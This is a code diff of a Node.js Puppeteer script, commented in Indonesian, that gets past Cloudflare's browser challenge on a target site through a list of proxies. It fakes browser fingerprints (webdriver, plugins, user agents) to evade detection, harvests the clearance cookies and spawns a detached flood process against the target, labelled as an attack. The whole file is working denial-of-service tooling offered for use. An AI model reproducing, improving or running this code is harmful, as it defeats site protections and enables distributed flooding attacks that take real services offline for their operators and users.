@@ -1,6 +1,7 @@
 const fs = require('fs');
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+const UserAgent = require('user-agents');
 const { spawn, exec } = require('child_process');
 
 puppeteer.use(StealthPlugin());
@@ -11,7 +12,6 @@ const COLORS = {
     YELLOW: '\x1b[33m',
     GREEN: '\x1b[32m',
     CYAN: '\x1b[36m',
-    BLUE: '\x1b[34m',
     RESET: '\x1b[0m'
 };
 
@@ -40,272 +40,123 @@ const readProxies = (filePath) => {
     }
 };
 
-// DAFTAR TOMBOL CLOUDFLARE YANG LENGKAP
-const getCloudflareButtonSelectors = () => {
-    return [
-        // Selector dasar
-        'input[type="submit"]',
-        'button[type="submit"]',
-        'button',
-        '.btn',
-        '.button',
-        
-        // Selector khusus Cloudflare
-        '#challenge-form input[type="submit"]',
-        '#challenge-form button',
-        'form input[type="submit"]',
-        'form button',
-        '[class*="challenge"] input[type="submit"]',
-        '[class*="challenge"] button',
-        '[class*="verify"]',
-        '[class*="success"]',
-        '[class*="human"]',
-        
-        // Selector by ID
-        '#success',
-        '#verify',
-        '#submit',
-        '#continue',
-        '#proceed',
-        
-        // Selector by value/text
-        'input[value*="Verify"]',
-        'input[value*="Continue"]',
-        'input[value*="Submit"]',
-        'input[value*="Success"]',
-        'input[value*="Proceed"]',
-        'input[value*="Bypass"]',
-        'button:contains("Verify")',
-        'button:contains("Continue")',
-        'button:contains("Submit")',
-        'button:contains("Success")',
-        'button:contains("Proceed")',
-        'button:contains("Bypass")',
-        
-        // Tombol bahasa Indonesia
-        'input[value*="Verifikasi"]',
-        'input[value*="Lanjutkan"]',
-        'input[value*="Kirim"]',
-        'input[value*="Berhasil"]',
-        'input[value*="Buktikan"]',
-        'input[value*="Manusia"]',
-        'button:contains("Verifikasi")',
-        'button:contains("Lanjutkan")',
-        'button:contains("Kirim")',
-        'button:contains("Berhasil")',
-        'button:contains("Buktikan")',
-        'button:contains("Manusia")',
-        
-        // Tombol bahasa lain
-        'input[value*="验证"]',
-        'input[value*="继续"]',
-        'input[value*="提交"]',
-        'button:contains("验证")',
-        'button:contains("继续")',
-        'button:contains("提交")'
-    ];
+// Generate realistic user agent
+const generateUserAgent = () => {
+    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
+    return userAgent.toString();
 };
 
-// CLOUDFLARE SOLVER DENGAN TOMBOL LENGKAP
+// NEW: Advanced Cloudflare solver dengan pendekatan berbeda
 const solveCloudflareChallenge = async (page, proxy) => {
     try {
-        coloredLog(COLORS.WHITE, `[SOLVER] Starting: ${maskProxy(proxy)}`);
+        coloredLog(COLORS.WHITE, `[SOLVER] Advanced approach: ${maskProxy(proxy)}`);
         
-        // Tunggu halaman load
-        await sleep(5000);
+        // Tunggu initial load
+        await sleep(3000);
         
         let title = await page.title().catch(() => '');
         let currentUrl = page.url();
         
-        coloredLog(COLORS.CYAN, `[SOLVER] Page: ${title}`);
+        coloredLog(COLORS.CYAN, `[SOLVER] Initial state: ${title}`);
         
         // Cek jika sudah berhasil
-        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && 
-            !title.includes('Verifikasi') && !title.includes('DDoS protection') &&
-            !currentUrl.includes('challenge') && !currentUrl.includes('cdn-cgi')) {
-            coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Already passed`);
-            return { success: true, method: 'already_passed' };
+        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+            coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: No challenge detected`);
+            return { success: true, method: 'no_challenge' };
         }
         
-        coloredLog(COLORS.YELLOW, `[SOLVER] Cloudflare challenge detected`);
+        coloredLog(COLORS.YELLOW, `[SOLVER] Cloudflare detected, using advanced methods...`);
         
-        // METHOD 1: Tunggu automatic solve
-        coloredLog(COLORS.WHITE, `[SOLVER] Method 1: Waiting for auto-solve (20s)`);
-        for (let i = 0; i < 20; i++) {
+        // METHOD 1: Biarkan Cloudflare solve sendiri (paling efektif)
+        coloredLog(COLORS.WHITE, `[SOLVER] Method 1: Letting Cloudflare auto-solve (30s)`);
+        
+        for (let i = 0; i < 30; i++) {
             await sleep(1000);
+            
             title = await page.title().catch(() => '');
             currentUrl = page.url();
             
-            if (!title.includes('Just a moment') && !title.includes('Checking your browser') && 
-                !title.includes('Verifikasi')) {
-                coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Auto-solve after ${i + 1}s`);
+            // Check multiple success conditions
+            if (!title.includes('Just a moment') && 
+                !title.includes('Checking your browser') &&
+                !currentUrl.includes('challenge') &&
+                !currentUrl.includes('cdn-cgi')) {
+                coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Auto-solved after ${i + 1}s`);
                 return { success: true, method: 'auto_solve' };
             }
-        }
-        
-        // METHOD 2: Cari dan klik semua jenis tombol Cloudflare
-        coloredLog(COLORS.WHITE, `[SOLVER] Method 2: Clicking all Cloudflare buttons`);
-        
-        const buttonSelectors = getCloudflareButtonSelectors();
-        let foundButtons = [];
-        
-        // Kumpulkan semua tombol yang ada
-        for (const selector of buttonSelectors) {
-            try {
-                const elements = await page.$$(selector);
-                for (const element of elements) {
-                    try {
-                        const isVisible = await element.evaluate(el => {
-                            if (!el) return false;
-                            const rect = el.getBoundingClientRect();
-                            const style = window.getComputedStyle(el);
-                            return rect.width > 0 && 
-                                   rect.height > 0 && 
-                                   style.display !== 'none' && 
-                                   style.visibility !== 'hidden' &&
-                                   el.offsetParent !== null;
-                        });
-                        
-                        if (isVisible) {
-                            foundButtons.push({
-                                element: element,
-                                selector: selector
-                            });
-                        }
-                    } catch (e) {}
+            
+            // Occasionally check page content
+            if (i % 5 === 0) {
+                const content = await page.content().catch(() => '');
+                if (content.includes('cf-browser-verification') || content.includes('cf_captcha_kind')) {
+                    coloredLog(COLORS.CYAN, `[SOLVER] Still in challenge at ${i + 1}s`);
                 }
-            } catch (e) {}
-        }
-        
-        coloredLog(COLORS.CYAN, `[SOLVER] Found ${foundButtons.length} visible buttons`);
-        
-        // Klik semua tombol yang ditemukan
-        for (const button of foundButtons) {
-            try {
-                coloredLog(COLORS.BLUE, `[SOLVER] Clicking: ${button.selector}`);
-                
-                // Scroll ke tombol
-                await button.element.evaluate(el => {
-                    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                });
-                
-                await sleep(1000);
-                
-                // Klik tombol
-                await button.element.click();
-                await sleep(5000);
-                
-                // Cek apakah berhasil
-                title = await page.title().catch(() => '');
-                currentUrl = page.url();
-                
-                if (!title.includes('Just a moment') && !title.includes('Checking your browser') && 
-                    !title.includes('Verifikasi')) {
-                    coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Button "${button.selector}" worked!`);
-                    return { success: true, method: 'button_click' };
-                }
-                
-                // Tunggu sebentar sebelum tombol berikutnya
-                await sleep(2000);
-                
-            } catch (error) {
-                coloredLog(COLORS.RED, `[SOLVER] Error clicking: ${error.message}`);
             }
         }
         
-        // METHOD 3: Cari tombol dengan text content
-        coloredLog(COLORS.WHITE, `[SOLVER] Method 3: Searching by button text`);
+        // METHOD 2: Coba interaksi natural dengan halaman
+        coloredLog(COLORS.WHITE, `[SOLVER] Method 2: Natural interaction`);
         
-        const buttonTexts = [
-            'Verify', 'Continue', 'Submit', 'Success', 'Proceed', 'Bypass',
-            'Verifikasi', 'Lanjutkan', 'Kirim', 'Berhasil', 'Buktikan', 'Manusia',
-            '验证', '继续', '提交', '인증', '계속', '제출'
-        ];
+        // Scroll sedikit
+        await page.evaluate(() => window.scrollBy(0, 200));
+        await sleep(1000);
         
-        for (const text of buttonTexts) {
+        // Cari elemen yang mungkin jadi tombol challenge
+        const possibleElements = await page.$$('input, button, a, [role="button"], [onclick]');
+        coloredLog(COLORS.CYAN, `[SOLVER] Found ${possibleElements.length} interactive elements`);
+        
+        for (let i = 0; i < Math.min(possibleElements.length, 5); i++) {
             try {
-                const elements = await page.$$('input, button, a, div');
-                for (const element of elements) {
-                    try {
-                        const elementText = await element.evaluate(el => el.textContent || el.value || '');
-                        if (elementText.includes(text)) {
-                            const isVisible = await element.evaluate(el => {
-                                const rect = el.getBoundingClientRect();
-                                return rect.width > 0 && rect.height > 0;
-                            });
-                            
-                            if (isVisible) {
-                                coloredLog(COLORS.BLUE, `[SOLVER] Clicking text: "${text}"`);
-                                await element.click();
-                                await sleep(5000);
-                                
-                                title = await page.title().catch(() => '');
-                                if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
-                                    coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Text button "${text}" worked!`);
-                                    return { success: true, method: 'text_button' };
-                                }
-                            }
-                        }
-                    } catch (e) {}
+                const element = possibleElements[i];
+                const tagName = await element.evaluate(el => el.tagName.toLowerCase());
+                const type = await element.evaluate(el => el.type || '');
+                const value = await element.evaluate(el => el.value || '');
+                
+                // Hanya klik elemen yang mungkin tombol challenge
+                if (tagName === 'input' && type === 'submit' || 
+                    tagName === 'button' ||
+                    value.includes('Verify') || value.includes('Continue')) {
+                    
+                    coloredLog(COLORS.CYAN, `[SOLVER] Clicking ${tagName} with value: ${value}`);
+                    
+                    // Scroll ke element
+                    await element.evaluate(el => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
+                    await sleep(500);
+                    
+                    // Klik element
+                    await element.click();
+                    await sleep(8000);
+                    
+                    // Check result
+                    title = await page.title().catch(() => '');
+                    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+                        coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Element click worked`);
+                        return { success: true, method: 'element_click' };
+                    }
                 }
-            } catch (e) {}
+            } catch (e) {
+                // Continue to next element
+            }
         }
         
-        // METHOD 4: Execute JavaScript challenges
-        coloredLog(COLORS.WHITE, `[SOLVER] Method 4: Executing JavaScript`);
-        try {
-            await page.evaluate(() => {
-                // Submit semua form
-                const forms = document.forms;
-                for (let i = 0; i < forms.length; i++) {
-                    try {
-                        forms[i].submit();
-                    } catch (e) {}
-                }
-                
-                // Trigger semua event submit
-                const submitEvents = document.querySelectorAll('[onsubmit]');
-                submitEvents.forEach(el => {
-                    try {
-                        const event = new Event('submit', { bubbles: true });
-                        el.dispatchEvent(event);
-                    } catch (e) {}
-                });
-                
-                // Execute challenge scripts
-                const scripts = document.querySelectorAll('script');
-                scripts.forEach(script => {
-                    try {
-                        if (script.textContent.includes('challenge') || 
-                            script.textContent.includes('verify') ||
-                            script.textContent.includes('submit')) {
-                            eval(script.textContent);
-                        }
-                    } catch (e) {}
-                });
-            });
-            
-            await sleep(8000);
-            
-            title = await page.title().catch(() => '');
-            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
-                coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: JavaScript execution worked`);
-                return { success: true, method: 'javascript' };
-            }
-        } catch (e) {}
+        // METHOD 3: Coba navigasi ulang dengan referrer
+        coloredLog(COLORS.WHITE, `[SOLVER] Method 3: Navigation with referrer`);
         
-        // METHOD 5: Reload dan coba lagi
-        coloredLog(COLORS.WHITE, `[SOLVER] Method 5: Reloading page`);
-        await page.reload();
+        await page.goto(targetURL, {
+            waitUntil: 'networkidle0',
+            timeout: 30000,
+            referer: targetURL
+        });
+        
         await sleep(10000);
         
         title = await page.title().catch(() => '');
         if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
-            coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Reload worked`);
-            return { success: true, method: 'reload' };
+            coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Navigation worked`);
+            return { success: true, method: 'navigation' };
         }
         
-        coloredLog(COLORS.RED, `[SOLVER] FAILED: All methods exhausted`);
+        coloredLog(COLORS.RED, `[SOLVER] FAILED: All advanced methods exhausted`);
         return { success: false, method: 'failed' };
         
     } catch (error) {
@@ -314,73 +165,170 @@ const solveCloudflareChallenge = async (page, proxy) => {
     }
 };
 
+// NEW: Enhanced browser configuration
+const createBrowser = async (proxy) => {
+    const userAgent = generateUserAgent();
+    
+    const args = [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--disable-dev-shm-usage',
+        '--disable-accelerated-2d-canvas',
+        '--disable-gpu',
+        '--no-first-run',
+        '--no-default-browser-check',
+        '--disable-background-timer-throttling',
+        '--disable-renderer-backgrounding',
+        '--disable-backgrounding-occluded-windows',
+        '--disable-ipc-flooding-protection',
+        '--disable-features=TranslateUI,BlinkGenPropertyTrees',
+        '--enable-features=NetworkService,NetworkServiceInProcess',
+        '--ignore-certificate-errors',
+        '--ignore-ssl-errors',
+        '--disable-web-security',
+        '--disable-site-isolation-trials',
+        '--disable-default-apps',
+        '--disable-extensions',
+        '--disable-translate',
+        '--no-pings',
+        '--use-gl=swiftshader',
+        '--disable-software-rasterizer',
+        '--disable-background-networking',
+        '--disable-sync',
+        '--disable-hang-monitor',
+        '--disable-prompt-on-repost',
+        '--disable-domain-reliability',
+        '--disable-component-update',
+        '--aggressive-cache-discard',
+        '--max_old_space_size=4096',
+        '--window-size=1920,1080',
+        `--user-agent=${userAgent}`
+    ];
+
+    return await puppeteer.launch({
+        headless: true,
+        args: args,
+        ignoreHTTPSErrors: true
+    });
+};
+
+// NEW: Advanced stealth setup
+const setupStealth = async (page) => {
+    // Set random viewport
+    await page.setViewport({
+        width: 1920 + Math.floor(Math.random() * 100),
+        height: 1080 + Math.floor(Math.random() * 100),
+        deviceScaleFactor: 1,
+        isMobile: false,
+        hasTouch: false,
+        isLandscape: true
+    });
+
+    // Set extra headers
+    await page.setExtraHTTPHeaders({
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Cache-Control': 'no-cache',
+        'DNT': '1',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1'
+    });
+
+    // Enhanced evasion
+    await page.evaluateOnNewDocument(() => {
+        // Plugin evasion
+        Object.defineProperty(navigator, 'plugins', {
+            get: () => [1, 2, 3, 4, 5]
+        });
+
+        // Language evasion
+        Object.defineProperty(navigator, 'languages', {
+            get: () => ['en-US', 'en']
+        });
+
+        // Webdriver evasion
+        Object.defineProperty(navigator, 'webdriver', {
+            get: () => false
+        });
+
+        // Chrome evasion
+        window.chrome = {
+            runtime: {},
+            loadTimes: () => ({}),
+            csi: () => ({}),
+            app: {}
+        };
+
+        // Permissions evasion
+        const originalQuery = navigator.permissions.query;
+        navigator.permissions.query = (parameters) => (
+            parameters.name === 'notifications' ?
+                Promise.resolve({ state: Notification.permission }) :
+                originalQuery(parameters)
+        );
+    });
+};
+
 // Extract cookies
-const extractCookies = async (page, proxy) => {
+const extractCookies = async (page) => {
     try {
-        await sleep(3000);
+        await sleep(2000);
         const cookies = await page.cookies();
         const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
         
-        coloredLog(COLORS.GREEN, `[COOKIES] Got ${cookies.length} cookies`);
-        return { success: true, cookies: cookieString, cookieCount: cookies.length };
+        // Filter Cloudflare cookies
+        const cfCookies = cookies.filter(cookie => 
+            cookie.name.includes('cf_') || 
+            cookie.name.includes('_cf')
+        );
+        
+        coloredLog(COLORS.GREEN, `[COOKIES] Extracted ${cookies.length} total, ${cfCookies.length} Cloudflare cookies`);
+        return { success: true, cookies: cookieString };
         
     } catch (error) {
         coloredLog(COLORS.RED, `[COOKIES] ERROR: ${error.message}`);
-        return { success: false, cookies: '', cookieCount: 0 };
+        return { success: false, cookies: '' };
     }
 };
 
-// Browser launcher
-const launchBrowser = async (targetURL, proxy) => {
+// Main browser function
+const launchBrowser = async (targetURL, proxy, index, total) => {
     let browser;
     try {
-        coloredLog(COLORS.YELLOW, `[BROWSER] Launching: ${maskProxy(proxy)}`);
+        coloredLog(COLORS.YELLOW, `[BROWSER ${index}/${total}] Launching: ${maskProxy(proxy)}`);
         
-        browser = await puppeteer.launch({
-            headless: true,
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--disable-accelerated-2d-canvas',
-                '--disable-gpu',
-                '--disable-blink-features=AutomationControlled',
-                '--no-first-run',
-                '--no-default-browser-check',
-                '--disable-extensions',
-                '--disable-web-security',
-                '--ignore-certificate-errors',
-                '--ignore-ssl-errors',
-                '--window-size=1920,1080',
-                '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            ]
-        });
-        
+        browser = await createBrowser(proxy);
         const page = await browser.newPage();
         
-        // Set user agent
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+        // Setup stealth
+        await setupStealth(page);
         
-        // Navigate to target
+        // Navigate dengan timeout lebih lama
+        coloredLog(COLORS.WHITE, `[BROWSER ${index}/${total}] Navigating...`);
         await page.goto(targetURL, { 
-            waitUntil: 'domcontentloaded',
-            timeout: 30000 
+            waitUntil: 'networkidle0',
+            timeout: 45000 
         });
         
-        // Solve Cloudflare challenge
+        // Solve challenge
         const challengeResult = await solveCloudflareChallenge(page, proxy);
         
         if (!challengeResult.success) {
             throw new Error(`Challenge failed: ${challengeResult.method}`);
         }
         
-        coloredLog(COLORS.GREEN, `[SUCCESS] Cloudflare solved via ${challengeResult.method}`);
+        coloredLog(COLORS.GREEN, `[SUCCESS ${index}/${total}] Solved via ${challengeResult.method}`);
         
         // Extract cookies
-        const cookieResult = await extractCookies(page, proxy);
+        const cookieResult = await extractCookies(page);
         
-        // Launch flood process
-        if (cookieResult.success) {
+        if (cookieResult.success && cookieResult.cookies) {
+            // Launch flood process
             const floodProcess = spawn('node', [
                 'floodbrs.js',
                 targetURL,
@@ -389,28 +337,28 @@ const launchBrowser = async (targetURL, proxy) => {
                 '1',
                 proxyFile,
                 cookieResult.cookies,
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'cloudflare-key'
+                generateUserAgent(),
+                'cf-session-key'
             ], {
                 detached: true,
                 stdio: 'ignore'
             });
             
             floodProcess.unref();
-            coloredLog(COLORS.GREEN, `[ATTACK] Flood process started with ${cookieResult.cookieCount} cookies`);
+            coloredLog(COLORS.GREEN, `[ATTACK ${index}/${total}] Flood process started`);
         }
         
         await browser.close();
-        return true;
+        return { success: true, method: challengeResult.method };
         
     } catch (error) {
         if (browser) await browser.close();
-        coloredLog(COLORS.RED, `[BROWSER] ERROR: ${error.message}`);
-        return false;
+        coloredLog(COLORS.RED, `[BROWSER ${index}/${total}] ERROR: ${error.message}`);
+        return { success: false, error: error.message };
     }
 };
 
-// Main execution
+// Main execution dengan rate limiting
 const main = async () => {
     const proxies = readProxies(proxyFile);
     if (proxies.length === 0) {
@@ -418,39 +366,65 @@ const main = async () => {
         return;
     }
 
-    coloredLog(COLORS.GREEN, `[START] Cloudflare solver with ${proxies.length} proxies`);
+    coloredLog(COLORS.GREEN, `[START] Advanced Cloudflare solver with ${proxies.length} proxies`);
     
-    let successCount = 0;
+    const results = {
+        success: 0,
+        failed: 0,
+        methods: {}
+    };
     
-    // Process proxies
-    for (let i = 0; i < proxies.length; i++) {
-        const proxy = proxies[i];
-        const success = await launchBrowser(targetURL, proxy);
-        if (success) successCount++;
+    // Process dengan concurrency terbatas
+    const concurrency = 2; // Max 2 browser bersamaan
+    const delayBetweenBatches = 10000; // 10 detik antara batch
+    
+    for (let i = 0; i < proxies.length; i += concurrency) {
+        const batch = proxies.slice(i, i + concurrency);
+        coloredLog(COLORS.CYAN, `[BATCH] Processing ${i + 1}-${i + batch.length} of ${proxies.length}`);
         
-        coloredLog(COLORS.CYAN, `[PROGRESS] ${i + 1}/${proxies.length} - ${successCount} successful`);
+        const batchPromises = batch.map((proxy, batchIndex) => 
+            launchBrowser(targetURL, proxy, i + batchIndex + 1, proxies.length)
+        );
         
-        // Delay between proxies
-        if (i < proxies.length - 1) {
-            await sleep(3000);
+        const batchResults = await Promise.all(batchPromises);
+        
+        // Update results
+        batchResults.forEach(result => {
+            if (result.success) {
+                results.success++;
+                results.methods[result.method] = (results.methods[result.method] || 0) + 1;
+            } else {
+                results.failed++;
+            }
+        });
+        
+        coloredLog(COLORS.WHITE, `[STATUS] Success: ${results.success}, Failed: ${results.failed}`);
+        
+        // Delay antara batch kecuali batch terakhir
+        if (i + concurrency < proxies.length) {
+            coloredLog(COLORS.CYAN, `[BATCH] Waiting ${delayBetweenBatches/1000}s before next batch...`);
+            await sleep(delayBetweenBatches);
         }
     }
     
-    coloredLog(COLORS.GREEN, `[COMPLETE] ${successCount}/${proxies.length} proxies successful`);
+    // Final report
+    coloredLog(COLORS.GREEN, `[FINAL] Completed: ${results.success} successful, ${results.failed} failed`);
+    coloredLog(COLORS.GREEN, `[FINAL] Success rate: ${((results.success/proxies.length)*100).toFixed(1)}%`);
+    coloredLog(COLORS.CYAN, `[METHODS] ${JSON.stringify(results.methods, null, 2)}`);
     
     // Wait for attack duration
+    coloredLog(COLORS.YELLOW, `[ATTACK] Running for ${duration} seconds...`);
     await sleep(duration * 1000);
     coloredLog(COLORS.YELLOW, '[SHUTDOWN] Attack completed');
 };
 
 // Handle process exit
 process.on('SIGINT', () => {
-    coloredLog(COLORS.YELLOW, '[INFO] Stopping...');
-    exec('pkill -f node', () => {});
+    coloredLog(COLORS.YELLOW, '[INFO] Stopping gracefully...');
     process.exit(0);
 });
 
-coloredLog(COLORS.GREEN, '[READY] 🛡️ ADVANCED CLOUDFLARE SOLVER STARTED 🛡️');
+coloredLog(COLORS.GREEN, '[READY] 🚀 ULTIMATE CLOUDFLARE BYPASS STARTED 🚀');
 main().catch(err => {
-    coloredLog(COLORS.RED, `[MAIN ERROR] ${error.message}`);
+    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
 });
